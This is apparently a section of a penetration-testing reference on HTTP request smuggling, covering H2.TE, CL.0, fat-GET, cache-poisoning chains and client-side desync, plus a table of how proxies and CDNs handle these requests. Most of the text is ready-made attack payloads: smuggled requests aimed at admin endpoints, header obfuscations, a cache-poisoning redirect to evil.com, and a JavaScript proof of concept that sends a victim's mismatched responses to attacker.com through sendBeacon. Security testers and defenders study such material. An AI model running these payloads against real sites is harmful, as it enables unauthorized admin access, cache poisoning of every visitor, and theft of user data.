# http-smuggling-test · part 3

> 分段 3/4。完整索引见 `http-smuggling-test.md`。

## 2. H2.TE — HTTP/2 Transfer-Encoding Desync

### 2.1 Concept

HTTP/2 specification forbids `transfer-encoding` in H2 frames. However, some front-end proxies don't strip it when downgrading to H1. If the back-end sees `transfer-encoding: chunked` in the downgraded H1 request, it uses chunked parsing while the front-end used H2 frame boundaries.

### 2.2 Attack Flow

```
Client ──[HTTP/2]──> Front-end proxy ──[HTTP/1.1]──> Back-end

1. Client sends H2 POST with:
   - transfer-encoding: chunked  (forbidden in H2, but proxy passes it through)
   - H2 DATA frame body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"

2. Front-end: ignores transfer-encoding (H2 doesn't use it)
   → forwards entire DATA frame as H1 body

3. Back-end: sees transfer-encoding: chunked
   → parses "0\r\n\r\n" as end-of-chunks
   → remaining bytes = smuggled request
```

### 2.3 Byte-Level Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example

```

### 2.4 Variations

Some proxies normalize the `transfer-encoding` header. Try obfuscations:

```http
transfer-encoding: chunked
Transfer-Encoding: chunked      (capitalized — H2 requires lowercase)
transfer-encoding: identity     (should be stripped but may pass)
transfer-encoding:  chunked     (extra space)
transfer-encoding: chunked\r\n  (trailing whitespace)
```

---
## 3. CL.0 — CONNECTION CLOSE DESYNC

### 3.1 Concept

CL.0 occurs when the back-end ignores the `content-length` header entirely and reads the body length as 0 — regardless of what `content-length` says. The remaining body bytes stay in the socket buffer for the next request.

Unlike CL.TE or TE.CL, CL.0 does NOT require `transfer-encoding`. It exploits endpoints that simply don't consume the body.

### 3.2 Vulnerable Conditions

- Endpoints that return a response before reading the full body (e.g., redirects, 301/302)
- Static file servers that ignore POST body
- Health-check endpoints
- Endpoints behind `Connection: close` that reuse the socket anyway

### 3.3 Attack Flow

```
1. Send POST to endpoint that ignores body:
   POST /redirect-page HTTP/1.1
   Host: target.example
   Content-Length: 30

   GET /admin HTTP/1.1
   X: x

2. Back-end sends 301 redirect immediately without consuming body
3. The "GET /admin HTTP/1.1\r\nX: x" remains in socket buffer
4. Next request on this connection is prepended with smuggled bytes
```

### 3.4 Detection

```bash
### Step 1: Find endpoints that respond without consuming body
### Candidates: redirects, 204, static pages serving POST

### Step 2: Send POST with Content-Length larger than actual body
curl -X POST https://target.com/static-page \
  -H "Content-Length: 50" \
  -d "GET /canary HTTP/1.1\r\nHost: target.com\r\n\r\n" \
  --http1.1

### Step 3: Send follow-up request on same connection
### If response matches /canary instead of expected page → CL.0 confirmed
```

### 3.5 Key Differences from CL.TE

| Aspect | CL.TE | CL.0 |
|---|---|---|
| Requires TE header | Yes | No |
| Front/back disagreement | CL vs TE | CL vs "ignore body" |
| Works without chunked support | No | Yes |
| Common targets | Proxies parsing TE | Static servers, redirect endpoints |

---
## 4. FAT GET REQUEST SMUGGLING

### 4.1 Concept

Some reverse proxies allow GET requests with a body (RFC 7230 permits but discourages it). The front-end may forward the body, but the back-end may ignore it for GET requests, leaving body bytes in the buffer.

### 4.2 Payload

```http
GET / HTTP/1.1
Host: target.example
Content-Length: 55

GET /admin HTTP/1.1
Host: target.example
Cookie: admin=true

```

### 4.3 Behavior Matrix

| Proxy/Server | GET Body Behavior |
|---|---|
| Nginx (as proxy) | Forwards body to back-end |
| Apache (as proxy) | Usually forwards body |
| HAProxy | Forwards body by default |
| AWS ALB | May strip body on GET |
| Cloudflare | May strip body on GET |
| Express.js (back-end) | Ignores GET body by default |
| Gunicorn (back-end) | Ignores GET body |
| PHP-FPM | Ignores GET body |

When front-end forwards and back-end ignores → desync.

### 4.4 Combined with Cache

```http
GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 70

GET /admin/delete-user?id=1 HTTP/1.1
Host: target.example
Cookie: admin=true

```

If the proxy caches `/static/app.js` responses, the smuggled request's response may get cached under `/static/app.js`.

---
## 5. REQUEST SMUGGLING → CACHE POISONING CHAIN

### 5.1 The Chain

```
1. Attacker smuggles a request that returns malicious content
2. The smuggled response is associated with a cacheable URL by the front-end
3. Cache stores malicious response under legitimate URL
4. All subsequent users requesting that URL get poisoned content
```

### 5.2 CL.TE → Cache Poisoning Example

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 10

x=1
```

**What happens**:
1. Front-end (CL): sends everything as one POST request
2. Back-end (TE): sees POST end at `0\r\n\r\n`, then `GET /static/app.js` as new request
3. Back-end responds to smuggled `GET /static/app.js` — but its response gets matched to the **next legitimate request** on the same connection
4. If next legitimate request is for `/static/app.js` → cache stores the matched response → poisoned

### 5.3 Targeted Poisoning

To control WHAT gets cached, smuggle a request that returns attacker-controlled content:

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 200
Transfer-Encoding: chunked

0

GET /redirect?url=https://evil.com/malicious.js HTTP/1.1
Host: target.example
X-Ignore: x
```

If `/redirect` returns a 302 or 301 to `evil.com`, and the cache stores this for the next request's URL, that URL now redirects to `evil.com` for all users.

### 5.4 Cache Poisoning via Response Queue Misalignment

```
Connection:
  Request A (smuggled) → Response A
  Request B (victim's) → Response B

Cache expects:
  Request B's URL → Response B

Actual:
  Request B's URL → Response A (wrong response)
  
If Response A contains XSS or redirect → cached under Request B's URL
```

---
## 6. CLIENT-SIDE DESYNC (CSD)

### 6.1 Concept

Client-Side Desync exploits browser `fetch()` API behavior to cause desynchronization between the browser and a web server. Unlike server-side smuggling (which poisons a shared connection pool), CSD poisons the **browser's own connection** to the target.

### 6.2 Prerequisites

1. Target server reuses connections (not `Connection: close` on every response)
2. A page on the target (or same-site) where attacker can inject JavaScript
3. The server has an endpoint that doesn't consume the full request body (CL.0-style)

### 6.3 Detailed Flow

```
1. Attacker's JS on victim's browser sends fetch() to target:

   fetch('https://target.com/trigger', {
     method: 'POST',
     mode: 'no-cors',
     credentials: 'include',
     body: 'GET /victim-data HTTP/1.1\r\nHost: target.com\r\n\r\n'
   });

2. Browser sends POST to /trigger with body containing smuggled GET
3. Server responds to POST immediately (ignoring body — CL.0)
4. Smuggled "GET /victim-data" remains in the TCP buffer

5. Attacker's JS sends a follow-up request on same connection:

   fetch('https://target.com/api/me', {
     credentials: 'include'
   });

6. Server processes the leftover "GET /victim-data" instead of "GET /api/me"
7. Response mismatch — browser gets /victim-data response for /api/me request
```

### 6.4 JavaScript PoC Template

```javascript
async function desync(targetUrl, triggerPath, smuggledRequest) {
    const body = smuggledRequest;

    // Step 1: Trigger the desync (CL.0 on trigger endpoint)
    await fetch(targetUrl + triggerPath, {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        body: body
    });

    // Step 2: Follow-up request on (hopefully) same connection
    const response = await fetch(targetUrl + '/api/profile', {
        credentials: 'include'
    });

    // Step 3: Exfiltrate if response is mismatched
    const data = await response.text();
    navigator.sendBeacon('https://attacker.com/log', data);
}

desync(
    'https://target.com',
    '/static/logo.png',  // CL.0-susceptible endpoint
    'GET /admin/users HTTP/1.1\r\nHost: target.com\r\n\r\n'
);
```

### 6.5 CSD Limitations

- Browser may use different connections for subsequent requests → desync fails
- `Connection: close` on server side prevents reuse
- HTTP/2 to single origin may use single connection (actually helps CSD)
- Same-site cookie policies may limit credential inclusion
- Hard to reliably predict connection reuse

### 6.6 CSD via Pause-Based Desync

```
1. Server has a timeout: if request body isn't fully received within N seconds, 
   server sends response and moves on
2. Attacker sends fetch() with:
   - Content-Length: 1000 (large)
   - Actual body: only 50 bytes + smuggled request
3. Server waits, times out, responds to partial request
4. Remaining bytes (smuggled request) stay in buffer
5. Next request on connection processes smuggled bytes
```

---
## 7. CDN / REVERSE PROXY BEHAVIOR MATRIX

### 7.1 CL + TE Handling

| Product | Dual CL+TE | Prefers | Notes |
|---|---|---|---|
| **HAProxy** | Forwards both | TE | Strips CL when TE is present (configurable) |
| **Nginx** | Rejects dual headers (400) | N/A | Strict — hard to smuggle through |
| **Apache (mod_proxy)** | Forwards both | CL | Historic CL.TE source |
| **Cloudflare** | Normalizes | TE | Strips CL when TE present; strong normalization |
| **AWS ALB** | Normalizes | Varies | Has had CL.TE vulns historically (patched) |
| **AWS CloudFront** | Normalizes | CL | May pass TE obfuscation variants |
| **Varnish** | Forwards both | TE | Configurable; default prefers TE |
| **Traefik** | Forwards both | TE | Go `net/http` based; strict chunked parsing |
| **Envoy** | Rejects dual (400) | N/A | Very strict HTTP/1.1 parsing |
| **Caddy** | Go-based; strict | TE | Similar to Envoy strictness |
| **Squid** | Forwards both | CL | Historic TE.CL source |
| **IIS (ARR)** | Forwards both | CL | Historic CL.TE/TE.CL source |

### 7.2 HTTP/2 Downgrade Behavior

| Product | H2→H1 Downgrade | TE Header Handling | CL Passthrough |
|---|---|---|---|
| **HAProxy** | Translates | May pass TE | Passes CL |
| **Nginx** | Translates | Strips TE (usually) | Passes CL |
| **Cloudflare** | Translates | Strips TE | Normalizes CL |
| **AWS ALB** | Translates | Strips TE | Passes CL |
| **AWS CloudFront** | Translates | May pass obfuscated TE | Passes CL |
| **Envoy** | Translates | Strips TE | Strict validation |
| **Traefik** | Translates | May pass TE | Passes CL |

### 7.3 GET Body Handling

| Product | Forwards GET Body | Notes |
|---|---|---|
| HAProxy | Yes | Default behavior |
| Nginx | Yes (as proxy) | Forwards if body present |
| Apache | Yes | Forwards body |
| Cloudflare | Strips | Removes GET body |
| AWS ALB | Depends on version | May strip |
| Varnish | Strips | Removes GET body |
| Envoy | Yes | Forwards |

### 7.4 Connection Reuse Behavior

| Product | Backend Connection Pooling | Impact on Smuggling |
|---|---|---|
| HAProxy | Yes (connection pool) | High risk — smuggled data affects other users |
| Nginx | Yes (keepalive upstream) | High risk |
| Cloudflare | Yes | High risk but strong normalization |
| AWS ALB | Yes | High risk |
| Envoy | Yes | Lower risk (strict parsing) |
| Varnish | Configurable | Depends on `beresp.do_stream` |

---
